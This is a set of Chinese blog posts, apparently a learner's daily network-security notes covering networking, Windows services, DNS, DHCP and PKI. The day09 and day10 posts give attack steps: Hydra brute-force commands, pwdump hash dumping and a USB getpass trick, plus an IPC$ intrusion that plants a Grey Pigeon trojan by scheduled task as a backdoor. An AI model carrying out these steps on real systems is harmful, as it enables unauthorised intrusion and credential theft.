[{"title":"day11 - OSI与TCP-IP 5层协议 | 物理层","url":"/2020/08/11/day11-OSI-TCP-IP-5/","content":"\n# 一、OSI与TCP-IP 5层协议\n\n## 分层模型\n\n### 分层思想\n\n- 将复杂的流程分解为几个功能相对单一的子过程\n    - 整个流程更加清晰，**复杂问题简单化**\n    - 更容易发现问题并针对性地解决问题\n    - 同层使用相同协议，下层为上层提供服务\n    \n- 使用网络的未必知道数据的传输过程\n\n    <!-- more -->\n\n---\n\n### OSI七层模型\n\n- OSI（Open System interconnection）\n是开放的通信系统互联参考模型\n- 历史：1947 年，ISO 组织发布了 OSI 参考模型\n\n![Untitled](..\\assets\\posts\\day11-OSI-TCP-IP-5\\Untitled.png)\n\n                                             —OSI 七层模型—\n\n- TCP/IP 5层协议簇/协议栈：会话层，表示层，应用层三层合并成为应用层，最后为五层协议\n- 这两个同时诞生，OSI 先有模型，TCP 先有协议\n- 四层模型：把 数据链路层 和 物理层 合并为网络接口层\n- 特点：上层对下层兼容，处于上层的设备一定可以识别所有下层的信息\n\n---\n\n### OSI模型 vs TCP/IP模型\n\n![Untitled 1](..\\assets\\posts\\day11-OSI-TCP-IP-5\\Untitled 1.png)\n\n---\n\n## 数据传输过程\n\n### 数据封装过程\n\n假设要发送“Hello”这个数据，首先是封包\n\n1.通过应用层，在软件中生成，进入传输层\n\n2.传输层对数据进行 封装 ，进入网络层\n\n- 传输层 完成进程与进程之间的通信\n- 封装：给数据加上 TCP/UDP 头\n在加头之前判断数据是从应用层中的哪个软件生成的\n然后在数据中加上原端口号和*目标端口号*(服务器端口号)\n- 封装完后整个数据为 **数据段**\n- 端口号是应用层的\nUDP：速度快，但安全性不高，不可靠传输(双方不建立连接)，像写信\nTCP ：速度不快，但安全性高，可靠传输(双方要建立连接)，像打电话\n\n3.网络层对数据再加上 IP包头 ，进入数据链路层\n\n- 网络层 完成点到点的通信   (行话，\"点\"指电脑)\n- 加上 IP 包头(包含源IP和目标IP)，加上后整个数据为 **IP包/报文**\n\n4.数据链路层（网卡）给数据加上 MAC子层 和 FCS ，进入物理层（网线）\n\n- 交换机工作在 数据链路层，意味着交换机没有上层的功能\n- MAC子层：简称帧头，源 MAC 地址和目标 MAC 地址\nFCS：帧校验序列，简称帧尾，4个字节，循环校验算法 CRC（类似hash）中的值，加上后整个数据为 **帧**\n\n5.物理层(网线) 将 帧 用数字信号(**比特流**)传输出去，经过交换机、路由器、服务器、防火墙等一系列设备到达 对方电脑网卡\n\n![Untitled 2](..\\assets\\posts\\day11-OSI-TCP-IP-5\\Untitled 2.png)\n\n---\n\n### 数据解封装过程\n\n6.数据链路层（网卡）检查 帧 的 MAC子层 和 FCS，检查MAC子层的目标MAC地址 与 该网卡的地址 是否吻合，吻合则解封装，不吻合就扔掉\n\n7.网络层接着校验IP包/报文，检查目标IP是不是本机，是则解包，不是就扔掉\n\n8.传输层对数据段解析，由TCP/UDP头里的目标端口号 将信息传给应用层的正确进程\n\n![Untitled 3](..\\assets\\posts\\day11-OSI-TCP-IP-5\\Untitled 3.png)\n\n---\n\n### 要点总结\n\n- 各层的 数据名称 及 对应设备：\n    1. 数据/PDU                        应用层           PC/防火墙    五层\n    2. 数据段/段     Fragment   传输层            防火墙         四层\n    3. 报文/包/IP包 packet        网络层            路由器         三层\n    4. 帧                  Franme       数据链路层    交换机 网卡 二层\n    5. 比特               bit              物理层            网线             一层\n        - 8 bit = 1 Byte字节\n        - 所谓的百兆宽带 (* ￣︿￣)，单位是b，100Mb/s=12.5MB/s ，而且一般还达不到......\n- 各层相关协议\n\n    ![Untitled 4](..\\assets\\posts\\day11-OSI-TCP-IP-5\\Untitled 4.png)\n\n- DNS补充：客户机与服务器之间用 UDP，服务器与服务器之间用 TCP\n\n# 二、物理层\n\n1. 传输媒介：网线 / 光纤 / 空气\n\n2. 信号：模拟信号（用放大器处理，不可复原）\n           数字信号（用中继器处理，抗干扰能力强，可复原，可传输距离短）\n\n    光信号：\n\n    光线类型:  \n    \n    1)单模光纤 一般线是黄色\n       2)多模光纤 一般线是橙色/蓝色\n    \n3. 网线 / 双绞线：(双绞，抗干扰，电磁场抵消)\n    - 5类双绞线\n    - 超5类双绞线\n    - 6类 7类 chegn\n    - 跳线：比较短的网线，1-3米长\n    \n4. 制作标准：（面向水晶头铜色拨片，颜色线顺序，加粗不变）\n\n    T568A：白绿、绿、白橙、**蓝、白、**橙、**白棕、棕**\n\n    T568B：白橙、橙、白绿、**蓝、白、**绿、**白棕、棕**\n\n5. 网线的用途分类： 具有三层功能以上的设备为同种设备\n    - 交叉线：一端为 A(发送)，一端为 B(接收)。同种设备间使用！\n    如路由器 ↔ 路由器，路由器 ↔ 电脑\n    - 直通线：两端都是 A 或 B，目前行业所见都是B线。异种设备间使用！如交换机 ↔ 电脑。\n    - 全反线：一端为 A，另一端为反 A，也称 console 线，用于配置企业路由器/交换机\n    \n6. 关于交换机的接口：\n\n    Ethernet                    10Mb/s           简写:   E\n    FastEthernet\t          100Mb/s                    F\n    GigabitEthernet\t  1000Mb/s                  G\n    TenGigabitEthernet\t  10000Mb/s                TG\n\n    例如 Ethernet0/3 中，0 是模块编号，3 是该模块的接口编号\n\n7. 家里一般用的”路由器“其实是交换机和路由器的杂交产品，真正的名字是”三层交换机“","tags":["网络安全"],"categories":["网络安全"]},{"title":"day10 - 扫描与爆破","url":"/2020/08/10/day10-Scanning&blasting/","content":"\n# 一、扫描技术\n\n## 1.扫描概述\n\n- 人工与工具的结合\n\n- 主机探测：确定目标主机是否存活\n\n- 端口扫描：寻找在线主机所开放的端口，并且在端口上所运行的服务。甚至可以进一步确定目标主机操作系统的类型和更详细的信息\n\n  <!-- more -->\n\n## 2.基础知识\n\n- 常见端口号\n\n    ![Untitled](..\\assets\\posts\\day10-Scanning&blasting\\Untitled.png)\n\n## 3.Nmap扫描器\n\n- 重要常用参数\n\n    ![Untitled 1](..\\assets\\posts\\day10-Scanning&blasting\\Untitled 1.png)\n\n- 常见用法\n\nNmap **-sP** 10.1.1.1**/24**                     #扫描10.1.1.0 整个网段\nNmap -p   **21,23-25,3389** 10.1.1.1  #扫描 指定IP的 指定端口\nNmap -p   21,23 10.1.1.1 **-sV**          # 扫描21，23的服务版本\nNmap **-A**   10.1.1.1                          #全面扫描\nNmap **-O**   10.1.1.1                          #扫描目标系统版本(win,linux)\nNmap -p    21,23 10.1.1.1 **-oN d:\\result.txt**  #生成一个结果文档\n\n# 二、爆破\n\n## 1.Hydra 九头蛇 远程爆破工具\n\n- Hydra -l 用户名 -p 密码 IP 端口服务名称\n    - 直接输账号密码（小写是已知项，大写是打开文件）\n- Hydra -L 用户名字典 -P 密码字典 IP 端口服务名称\n    - 不知道账号密码，用字典暴力破解\n\nHydra.exe -l a -p 123 10.1.1.1 telnet\n\nHydra.exe -l a **-P**  d:\\password.txt  10.1.1.1  ftp\nHydra.exe -l a **-P**  d:\\password.txt  10.1.1.1  mysql\n\nHydra.exe **-L** d:\\user.txt **-P**  d:\\password.txt  10.1.1.1  mysql\n\n## 2.本地爆破\n\n- get pass 漏洞：系统登陆后会把密码保存在内存中 (win10 已经修复)\n\n    过程：用 cmd 运行 getpass.exe 即可\n\n    - 操作方法：在目标电脑上插上U盘，提前写个批处理，执行getpass.exe，将结果保存为txt，拔出就有密码了\n- 5 次 shift 粘滞键漏洞\n- 用 pwdump 获取登陆 hash 然后解密\n\n    ![Untitled 2](..\\assets\\posts\\day10-Scanning&blasting\\Untitled 2.png)\n\n    手工将hash值存储到hash.txt中\n\n    使用saminside软件进行暴力破解\n\n    ![Untitled 3](..\\assets\\posts\\day10-Scanning&blasting\\Untitled 3.png)\n\n","tags":["网络安全"],"categories":["网络安全"]},{"title":"day09 - 简单渗透测试","url":"/2020/08/09/day09-Simple-penetration-test/","content":"\n# 一、简单渗透测试思路\n\n## 0.授权（别人让你攻击）\n\n## 1.信息收集\n\n- nslookup 域名 查IP\n\n- nslookup whois 查子域名\n\n  <!-- more -->\n\n## 2.扫描漏洞\n\n- nmap（扫描软件） scanport（端口扫描）\n\n    且利用 telnet 命令也可以探测：telnet IP 端口号，若标题变成 telnet 则说明开放\n\n- 首先基础扫描 IP 范围 端口\n- 然后再根据端口深入扫描 （IIS，apache，什么网站）\n- 高级扫描：\n\n    扫描容器漏洞：如 IIS 漏洞 2003-IIS6.0 或 2008-IIS7.0 版本的\n\n    扫描网站漏洞（SQL 等）\n\n## 3.漏洞利用\n\n## 4.提权（shell环境、桌面环境 、最高权限）\n\n## 4.5.做该做的事情...\n\n## 5.毁尸灭迹\n\n## 6.留后门\n\n## 7.渗透测试报告（正规）\n\n---\n\n# 二、简单渗透测试过程\n\n- 手工测试端口号开放：telnet IP地址 测试端口\n- 自动测试端口号开放：scanport小工具\n- **445漏洞之 IPC$**\n\n    ```bash\n    net use f: \\\\10.1.1.2\\share 密码 /user:用户 == 把分享文件映射到自己电脑\n    net use f: /del        删除共享映射\n    net use * /del         删除所有共享映射\n    net use f: \\\\10.1.1.2\\c$   密码 /user:用户     进入C盘\n    net use \\\\10.1.1.2\\IPC$ 密码 /user:用户     == IPC漏洞\n    ```\n\n- **暴力破解系统密码之445**\n    - 软件：ntscan1.0 (只能针对445弹框做暴力破解)     //也可用 hydra\n    - 用字典编写软件编写个字典\n- **创建后门**\n    - 用灰鸽子制作木马\n    - copy 植入木马\n    - net time \\\\10.1.1.2 查看目标当前时间\n    - at \\\\10.1.1.2 11:30 “c:\\windows\\system32\\heihei.exe” 创建一个计划任务，在11:30时运行exe文件\n\n    简单流程\n    1.scanport扫描445端口\n    2.进行暴力破解：NTscan\n    3.网络映射：net  use  \\\\10.1.1.2\\ipc$  密码  /user:用户\n    4.制作木马—灰鸽子\n    5.植入木马—留后门\n    6.copy  d:\\haha.exe  \\\\10.1.1.2\\c$\n    7.设置计划任务 自动执行木马：\n            net  time  \\\\10.1.1.2\n            at  \\\\10.1.1.2 11:30  \"c:\\haha.exe\"\n    8.等待肉鸡上线","tags":["网络安全"],"categories":["网络安全"]},{"title":"day08 - PKI","url":"/2020/08/08/day08 - PKI /","content":"\n# 1.PKI概述\n\n- 名称：Public Key Infrastructure 公钥基础设施\n\n- 作用：通过加密技术和数字签名保证信息的安全\n\n- 组成：公钥加密技术、数字证书、CA、RA\n\n  <!-- more -->\n\n# 2.信息安全三要素\n\n- 机密性\n\n- 完整性\n- 身份验证/操作的不可否认性\n\n# 3.哪些IT领域用到PKI\n\n- SSL/HTTPS\n- IPsecVPN\n- 部分远程访问VPN\n\n# 4.公钥加密技术\n\n- 作用：实现对信息加密、数字签名等安全保障\n- 加密算法：\n    1. 对称加密算法   （DES，3DES，AES）\n        - 加解密的密钥一致\n    2. 非对称加密算法（RSA，DH）\n        - 通信双方各自产生一对公私钥\n        - 双方各自交换公钥\n        - 公钥和私钥互为加解密关系！\n        - 公私钥不可互相逆推！\n    3. HASH 算法：MD5 SHA（不可逆，验证完整性）\n        - HASH值 == 摘要\n\n# 5、数字签名\n\n- 用 **自己的私钥** 对 **摘要** 加密得出的密文就是 数字签名\n\n# 6、证书\n\n- CA是权威证书颁发机构\n\n- 证书用于保证**公钥**的合法性\n\n- 证书格式遵循 X.509 标准\n- 数字证书保护信息：\n\n    使用者的公钥值\n\n    使用者标识信息（如名称和电子邮件地址）\n\n    有效期（证书的有效时间）\n\n    颁发者标识信息\n\n    颁发者的数字签名\n\n- 数字证书由公正权威的第三方机构即 CA 签发\n\n# HTTPS通信过程\n\n![Untitled](..\\assets\\posts\\day08 - PKI \\Untitled.png)\n\n# PKI实验\n\n实验步骤;\n\n1. 配置服务器IP地址10.1.1.2 /24\n2. 安装IIS服务，并建立站点。\n\n    在客户机上验证访问 http://www.flower.com\n\n3. 安装CA组件\n4. 打开IIS，先生成证书申请文件\n5. 向CA申请证书：\n\n    打开网页：http://10.1.1.2/certsrv 并向CA发送web服务器申请文件\n\n6. CA颁发证书\n7. 在web服务器上下载并完成安装\n8. 在web服务器上启用SSL443\n9. 在客户端上验证","tags":["网络安全"],"categories":["网络安全"]},{"title":"day07 - 域","url":"/2020/08/07/day07-domain/","content":"\n# 1、 域的概述\n\n- Domain 域\n\n- 内网环境：\n    1. 工作组：默认模式，人人平等，不方便管理\n    2. 域       ：人人不平等，集中管理，统一管理\n    \n- 域的特点：\n\n    **集中管理/统一管理**\n    \n    <!-- more -->\n\n# 2、域的组成\n\n- 域控制器：DC（Domain Controller）\n- 成员机\n\n# 3、域的部署\n\n- 安装域控制器--就生成了域环境\n- 安装活动目录--就生成了域控制器\n- 活动目录：Active Directory == AD（DC的**核心**）\n\n# 4、活动目录\n\n- AD\n- 特点：集中管理/统一管理\n\n# 5、部署安装活动目录：\n\n1. 开启2008虚拟机，并桥接到一个VMnet里\n2. 配置静态 IP 地址 10.1.1.1 /24 (指子网掩码24位，即255.255.255.0)\n3. 开始--运行--输入 dcpromo，安装活动目录\n\n    弹出向导：\n\n    勾选DNS  --  新林中新建域  --  域的FQDN（onepiece.com）--  设置林功能级别和域功能级别，可都为2003  --  设置目录还原密码(666.com)  --    勾选安装后重启\n\n4. 在DC登录域  ONEPIECE/administrator，DC的本地管理员自动升级为域管理员，\n5. 检验AD是否安装成功：\n    1. 计算机右键属性  -  查看所属域\n    2. DNS服务器中是否自动创建onepiece.com区域文件\n    及自动注册DC的域名解析记录\n    3. 开始 -- 管理工具 -- AD用户和计算机\n\n         computer：普通域成员机列表\n\n         Domain Controller：DC列表\n\n         users：域账号\n\n# 6、PC加入域\n\n1. 配置IP，并指DNS，且要把ipv6去勾\n2. 计算机右键属性--更改--加入onepiece.com域\n    - DC发来验证，需要有权限加入域的账号密码\n    若用域管理员登录，用户名为administrator,若识别出域，直接写用户名,  若没有则用户名写  onepiece.com\\administrator\n3. 重启加入域后，成功使用域用户登录成员机\n    - 通常用户名例如：路飞 —> fei.lu\n\n常见的小问题\n1）加入域不成功\n    网络是不是不通，IP有没有配好 \n    解析是否成功解析，nslookup 域名\n    是否为DNS缓存问题，ipconfig  /flushdns\n2）登入域不成功\n     如XP，已勾选登录域onepiece，不用再写onepiece.com\\fei.lu\n3）域用户的权限 \n     建议将域用户加入到普通成员机的本地管理员组中\n\n×××本地管理员组：administrators\n×××域管理员组    ：Domain Admins\n\n# 7、组织单位 OU\n\n- 组织单位：OU，Organizational Unit\n- 作用：用于归类域资源（域用户、域计算机、域组）下发组策略\n- 创建：在域管理中右键新建\n\n# 8、组策略 GPO\n\n- GPO：Group Policy\n- 作用：通过组策略可以修改计算机各种属性，如开始菜单、桌面背景、网络参数\n- 组策略在域中，是基于OU下发的\n- 在域中，组策略的应用顺序是 LSDOU\n  LSDOU（策略优先级）Local Site Domain Organizational Unit\n  应用过程中，如果出现冲突，后应用的生效\n\n    ===LSDOU顺序\n    上级OU： 桌面：aa              |        运行：删除\n    下级OU： 桌面：未配置       |        运行：不删除\n\n    =正常情况下：\n    结果     ： 桌面：aa               |       运行：不删除\n\n    =下级OU设置了阻止继承：(只看自己OU的组策略)\n    结果     ：  桌面：未配置       |       运行：不删除\n\n    =上级设置了强制：             (下级组策略只看强制的组策略)\n    结果     ：  桌面：aa              |        运行：删除\n\n    注意：当上级强制和下级阻止继承同时设置，强制生效","tags":["网络安全"],"categories":["网络安全"]},{"title":"day06 - IIS - WEB服务器 | FTP服务器","url":"/2020/08/06/day06-IIS-WEB-FTP/","content":"\n\n# 一、WEB服务器\n\n## 1、WEB服务器概述\n\n- WEB服务器也称为网页服务器，HTTP服务器，WWW万维网服务器等\n\n- 使用协议是HTTP或HTTPS协议    (浏览器专业名称其实是HTTP客户端)\n\n  <!-- more -->\n\n## 2、WEB服务器端口号\n\n- HTTP  : TCP 80\n- HTTPS: TCP 443\n\n## 3、WEB服务器发布软件：\n\n- 微软：IIS（Internet Information Services互联网信息服务)\n(可以发布web网站和FTP站点）\n- linux：Apache /LAMP /Tomcat /nginx 等等\n- 第三方软件：phpstudy、XAMPP      (基于LAMP，仅限学习测试使用)\n\n## 4、部署WEB服务器\n\n1. 配置静态 IP 地址\n2. 安装 IIS-WEB 插件（此时80端口已经打开）\n3. 停用默认站点       （当一个站点都没有时，端口自动关闭）\n4. 新建网站--设置IP地址和端口--指定站点路径--设置权限\n5. 设置默认文档（即设置首页）\n\n## 5、一台服务器同时发布多个WEB站点\n\n- 不同的 IP，相同的端口\n- 相同的 IP，不同的端口（不建议使用1000以下的端口）\n- 相同的 IP，相同的端口，不同的域名（主机头）\n\n    1. 在IIS中新建网站，在IP地址和端口设置时，配置本机IP ，设置主机头为相应域名www.onepiece.com\n    2. 导入网页文件所在文件夹 D:\\onepiece，允许匿名访问，网站新建完成\n    3. 右键属性，在文档选项中，默认文档添加index.html，移至最前\n       此时可以通过 IP 访问网站\n       4.配好DNS服务器，新建区域 onepiece.com，新建主机名称为www\n       此时就可以通过 www.onepiece.com 来访问该网站了\n\n## 6、网站类型\n\n- 静态网站：一般扩展名为 .html 或 htm，无后台数据库（可不是不会动！）\n- 动态网站：一般扩展名为 .asp 或 .php，有后台数据库，asp 或 php 可以连接前台页面与后台数据库\n\n    *默认 IIS 禁用动态网站，需要在WEB服务扩展里打开 Active Server Pages 服务\n\n- 本质区别：动态网站能与用户进行交互（登陆），而静态网站不能\n\n# 二、FTP服务器\n\n## 1、FTP服务器概述\n\n- File Transfer Protocol                 文件传输协议\n\n## 2、FTP端口号\n\n- TCP      20/21\n\n## 3、FTP工作模式\n\n- 主动模式（ PORT ）：服务器主动从 20 端口向客户机传输数据\n- 被动模式（ PASV ）：客户机向服务器发出传输请求，然后服务器从随机生成的端口向客户机传输数据\n\n主被动模式阐述的是数据传输过程\n主被动模式选择权在客户机\n主被动是站在服务器角度来说的\n（主动模式：客户机想让服务器主动）\n\n- 端口的区别：\n\n    20端口：数据传输端口（传输文件的）\n\n    21端口：命令控制端口（传输指令的，比如客户机想要登陆 FTP 就要发送到服务器的 21 端口上）\n\n- FTP传输简要原理/过程：\n    1. 客户机随机开一个端口 50001，向服务器端口 21 发送连接请求，然后进行用户登录\n    2. 当客户机向服务器发送了下载文件的请求时，根据工作模式分为两种情况：\n        - 主动模式：\n\n            客户机随机开一个端口 50002，同时服务器开启 20 端口，并从 20 端口向客户机主动传输文件\n\n            - 若客户机开着防火墙，则服务器无法访问50002端口，那么主动模式没用，只能是被动模式\n        - 被动模式：\n\n            客户机随机开一个端口 50002，同时服务器在本地随机开放一个端口 20001，之后客户机主动向服务器发送传输请求，接到请求之后服务器再开始传输文件（即回包）\n\n            - 若服务器开着防火墙，则客户机无法访问20001端口，那么被动模式没用，只能是主动模式\n- 关于客户机连接异常的解决方法：关闭防火墙，把主被动模式都试一下\n\n![Untitled](..\\assets\\posts\\day06-IIS-WEB-FTP\\Untitled.png)\n\n## 4、部署FTP服务器\n\n1. 配置静态 IP\n2. 安装 IIS - ftp软件（此时21端口已经打开）\n3. 使用默认站点或者创建新的站点（当一个站点都没有时，端口自动关闭）\n\n    *注意：用户最终权限为 FTP 权限与 NTFS 权限取交集，与共享权限类似\n\n    **建议：FTP 权限全打勾，在 NTFS 设置具体权限\n\n4. 禁止匿名访问\n- 访问方式：ftp://10.1.1.1 ，输入账号密码","tags":["网络安全"],"categories":["网络安全"]},{"title":"day05 - DHCP部署与安全","url":"/2020/08/05/day05-DHCP/","content":"\n# 1、DHCP作用\n\n- DHCP（ Dynamic Host Configure Protocol，动态主机配置协议）\n\n- 自动分配 IP 地址\n\n  <!-- more -->\n\n# 2、DHCP相关概念\n\n- 地址池/作用域：（IP、DNS、子网掩码、网关、租期）\n- DHCP协议端口是UDP 67/68\n\n# 3、DHCP优点\n\n- 减少工作量\n- 避免IP冲突\n- 提高地址利用率\n\n---\n\n# 4、DHCP原理\n\n- 也称为 DHCP 租约过程，分为四个步骤：\n    - **客户机发送 DHCP Discovery 广播包**\n\n         客户机广播请求 IP 地址（包含客户机的 MAC 地址，即物理地址）\n\n    - **服务器响应 DHCP Offer 广播包**\n\n         服务器响应提供的 IP 地址（但无子网掩码、网关等参数）\n\n    - **客户机发送 DHCP Request广播包**\n\n         客户机选择 IP（也可认为确认使用哪个 IP）\n\n    - **服务器发送DHCP ACK广播包**（acknowledge，确认）\n\n         服务器确定了租约，并提供网卡详细参数IP，掩码，网关，DNS，租期等\n\n---\n\n# 5、DHCP续约\n\n- 1)当租期过 50% 的时候，客户机会再次发送 **DHCP Request** 包，进行续约\n2)如果服务器无响应，则继续使用并在 87.5% 时再次发送 **DHCP Request** 包，进行续约\n3)如果仍未响应，则释放 IP 地址\n4)并重新发送 **DHCP Discovery** 包来获取IP地址\n- 当无任何服务器响应时，自动给自己分配一个 169.254.x.x/16，属于全球统一无效地址，用于临时内网通信\n\n# 6、部署DHCP服务器\n\n1. IP 地址固定（服务器必须固定 IP 地址）\n2. 安装DHCP服务插件\n3. 新建作用域及作用域选项，设置网关IP，及DNS服务器IP\n4. 激活\n5. 客户机验证：可以通过网络连接的禁用启用，或者拔插网线，使之连接\n\nipconfig /release \n释放IP         (取消租约，或者改为手动配置IP，也可以释放租约)\n\nipconfig /renew \n重新获取IP（有IP时，发送 Request 包续约，无IP时发送 Discovery 包重新获取IP）\n\n# 7、地址保留\n\n- 对指定的 MAC 地址，固定动态分配 IP 地址\n\n场景：公司有个任性的boss想在 使用自动分配IP 时 获得一个固定的IP(没什么用)\n原理：对指定电脑的MAC地址作保留，今后收到此地址发来的Discovery包时，将指定 IP 分配给他\n\n# 8、选项优先级\n\n- 作用域选项＞服务器选项\n- 当服务器上有多个作用域时，可以在服务器选项设置DNS服务器\n\n# 9、DHCP备份和还原\n\n- 右键服务器可以备份，建议备份到U盘\n- 在电脑损坏时，拿一台新的服务器，配置DHCP，插入U盘，点击还原即可\n\n# 10、DHCP攻击与防御\n\n- 攻击 DHCP 服务器：频繁的发送伪装 DHCP 请求(假MAC)，直到将 DHCP 地址池资源耗尽，导致正常请求无法回应\n\n    防御：在交换机（管理型）的端口上做动态 MAC 地址绑定\n\n- 伪装 DHCP 服务器：hacker 通过将自己部署为 DHCP 服务器，为客户机提供非法IP地址(无法上网)\n\n    防御：在交换机（管理型）除合法的 DHCP 服务器所在接口外，全部设置为禁止发送 DHCP Offer 包","tags":["网络安全"],"categories":["网络安全"]},{"title":"day05 - DNS部署与安全","url":"/2020/08/05/day05-DNS/","content":"\n# 1、DNS\n\n- Domain Name Service\n\n- 域名服务\n\n- 作用：为客户机提供域名解析服务\n\n  <!-- more -->\n\n# 2、域名组成\n\n- 如“www.sina.com.cn” 是一个域名，从严格意义上来说“sina.com.cn”才被称为域名（全球唯一），而“www”是主机名\n\n- “主机名.域名”称为完全限定域名（FQDN,Fully Qualified Domain Name）\n    - 一个域名下可以有多个主机，域名全球唯一，那么“主机名 .域名”肯定也全球唯一\n    - 主机名为服务器标识，如www.sina.com.cn 和mail.sina.com.cn ,就是说 新浪公司有两台DNS服务器，一台的标识为www，一台的标识为mail\n\n    ![Untitled](..\\assets\\posts\\day05-DNS\\Untitled.png)\n\n    例:\n    www.baidu.com. \n    这个.默认浏览器自动添加\n    .为根域\n    .com为顶级域\n    baidu为一级域名\n    www为二级域名\n\n    - FQDN = 主机名.DNS后缀\n    - FQDN（完整合格的域名）\n\n# 3、监听端口\n\n- TCP          53\n- UDP         53\n\n# 4、DNS解析种类\n\n- **按照查询方式**\n\n    1.递归查询：客户机与本地 DNS 服务器之间 （DNS服务器转发器也算）\n    （所问既所答，1 和 8）\n\n    2.迭代查询：本地 DNS 服务器与根等其他 DNS 服务器的解析过程\n    （所闻非所答，2—7）\n\n    ![Untitled2](..\\assets\\posts\\day05-DNS\\2020_07_25_15_07_Office_Lens.jpg)\n\n    - DNS解析过程： 客户机想访问 www.baidu.com\n        1. 查找本机缓存\n        2. 若无则找本机 host\n        3. 还没有就向本地 DNS 服务器发出请求\n        4. 本地 DNS 服务器查找 DNS 缓存 和 内置的解析 ，若有则向客户机返回 IP 地址\n        5. 若无则向外查找\n        6. 本地 DNS 服务器向 根域 DNS 服务器发送请求\n        7. 根域 DNS 服务器回应 .com域名服务器 的 IP 地址\n        8. 本地 DNS 服务器向 .com域名服务器 发送请求\n        9. .com域名服务器回应 baidu.com域名服务器 的 IP 地址\n        10. 本地 DNS 服务器向 baidu.com域名服务器 发送请求\n        11. baidu.com域名服务器回应 www.baidu.com 对应的 IP 地址\n        12. 本地 DNS 服务器把收到的 IP 地址返回给客户机，并记下缓存\n        13. 客户机收到地址并记下缓存\n- **按照查询内容分类**\n    1. 正向解析：已知域名，解析IP地址\n    2. 反向解析：已知IP地址，解析域名\n        - nslookup手工解析时，会进行反向解析，显示真实服务器信息\n\n# 5、DNS服务器搭建过程\n\n- 要求网卡 IP 是静态 IP 地址\n- 安装 DNS 服务器插件（也就是安装并开启 TCP 及 UDP 53 端口）\n- 创建区域文件（负责一个域名后缀的解析，如 baidu.com 为域名后缀，一台 DNS 服务器内可以存放多个区域文件）\n- 新建 A 记录 (主机记录)，设置主机名，如www，设置IP\n- **域名解析记录类型：**\n    - A记录：正向解析记录\n    - CNAME记录：别名\n        - 给A记录设置别名，如给www起别名lalala\n        访问lalala.baidu.com，其实就是访问www.baidu.com\n    - PTR记录：反向解析记录\n    - MX：邮件交换记录\n    - NS：域名服务器解析\n\n# ６、DNS客户机解析方法\n\n1. 设置DNS服务器 IP \n2. 手工解析域名：nslookup 域名\n\nnslookup   进入域名解析模式，输入域名就返回IP\nexit            退出该模式\n\n# 7、域名请求的顺序\n\n- 客户机处理DNS请求顺序：DNS缓存--本地hosts文件--找本地DNS服务器\n- 服务器处理DNS请求顺序：DNS高速缓存--本地区域解析文件--转发器--根\n\n# 8、辅助DNS服务器\n\n- 作用：为主 DNS 服务器提供备份，提高安全性，会实时更新\n- 创建过程：\n    1. 在主要 DNS 服务器中，对想要备份的区域右键--属性--区域复制里，勾上”只允许到下列服务器“并把辅助 DNS 服务器的 IP 地址添加上去\n    2. 在辅助 DNS 服务器中，新建区域并选择辅助区域，IP 地址填主要 DNS 服务器即可\n\n# 9、清除DNS缓存\n\n- **客户机清除缓存**\n    - ipconfig /flushdns              清除 DNS 缓存\n    ipconfig /displaydns           查看 DNS 缓存\n    - 清除缓存原因：某网站域名解析若有缓存，第二次解析时直接在本地缓存中找，即使网站的IP 已经更改，解析时仍返回 缓存中的IP\n- **服务器清除缓存**\n    - windows服务器：dns工具--查看--高级，调出缓存，清除缓存\n\n# 10、DNS服务器分类\n\n- 主要名称服务器\n- 辅助名称服务器 == 备份的\n- 根名称服务器     == 全球只有13台\n- 高速缓存名称服务器 == 只保存缓存，不解析\n\n# 11、为DNS主机命名\n\n1. 在正向区域里新建主机记录，设置主机名为dns1，设置IP 为服务器IP\n2. 在反向区域新建 PTR 指针，设置IP为服务器IP，主机名选择之前创建的dns1","tags":["网络安全"],"categories":["网络安全"]},{"title":"day04 - 文件共享服务器(Cifs)","url":"/2020/08/04/day04-Cifs/","content":"\ncifs：公司对内偏多 (微软开发,所有windows系统都有,适合win系)\nftp ：对外偏多\n\n<!-- more -->\n\n# 一、文件共享服务器概述\n\n- 通过网络提供文件共享服务，提供文件下载和上传服务（类似于FTP服务器）\n\n# 二、创建共享\n\n- 方法:文件夹右键属性－共享－开启共享－设置共享名－设置共享权限\n- 注：\n\n    1）在本地登录时，只受NTFS权限的影响\n    2）在远程登录时，将受共享及NTFS权限的共同影响，且最终权限取交集。\n    3）所以建议设置共享权限为everyone完全控制，然后具体的权限在NTFS中设置即可。\n\n# 三、访问共享\n\n- 在开始运行或我的电脑地址栏中，输入 UNC 地址：\n\\\\文件共享服务器IP\n\\\\文件共享服务器IP\\共享名  (与共享文件在服务器的路径位置无关)\n- 第一次访问需要服务器上一个账户,共享前,服务器可以新建一个临时用户\n再次访问会直接登录,若要换账号登录,自己电脑注销重进就可以\n\n# 四、隐藏共享与访问方法\n\n- 在分享时将分享名后面加上 $ 符号，如 share$\n- 在访问使需要知道该共享名 share$ 才能访问\n手动输入  \\\\文件共享服务器IP\\共享名  ，如\\\\10.1.1.2\\share$\n\n# 五、相关共享DOS命令\n\n- net share                                  #列出共享列表\n- net share 共享名=共享路径    #创建共享，如 net share c$=c:\\\n- net share 共享名 /del              #删除共享文件\n\n# 六、屏蔽系统隐藏共享自动产生\n\n- **打开注册表**\n\n    打开注册表编辑器：regedit\n\n- **定位共享注册表位置**\n\n    位置：（可百度自查）\n\n    HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Service\\lanmanserver\\parameters\n\n    在该位置新建 REG_DWORD 类型的 AutoShareServer ，并将值设为 0\n\n# 七、查看本地网络连接状态\n\n         netstat -an （查端口，是否开放）\n\n# 八、关闭445服务\n\n可以通过关闭445端口来屏蔽病毒传入（如勒索病毒等）\n\n- 方法1：打开 services.msc，停止并禁用 server 服务，且把恢复一栏都改为不操作\n- 方法2：禁止被访问445，配置高级安全防火墙--入站规则（win7及以上系统，win2008及以上系统）\n\n常见端口：\n    3389                        *#远程桌面*\n    23                            *#telnet*\n    445                          *#共享服务*","tags":["网络安全"],"categories":["网络安全"]},{"title":"day04 - NTFS安全权限","url":"/2020/08/04/day04-NTFS/","content":"\n\n# 一、NTFS权限概述\n\n1. 通过设置NTFS，实现不同用户访问不同对象（文件，文件夹）的权限\n\n2. 分配了正确访问权限后，用户才能访问不同的权限\n\n3. 设置权限防止资源被篡改、删除\n\n   <!-- more -->\n\n# 二、文件系统概述\n\n- 文件系统即在外部存储设备上组织文件的方法\n\n    常见的文件系统\n\n    - FAT       windows\n    - NTFS     windows\n    - EXT       linux常见\n\n# 三、NTFS特点 (FAT不具备)\n\n1. 提高磁盘读写性能\n2. 可靠性\n加密文件系统\n访问控制列表（设置权限）ACL: access control list\n3. 磁盘利用率\n压缩\n磁盘配额 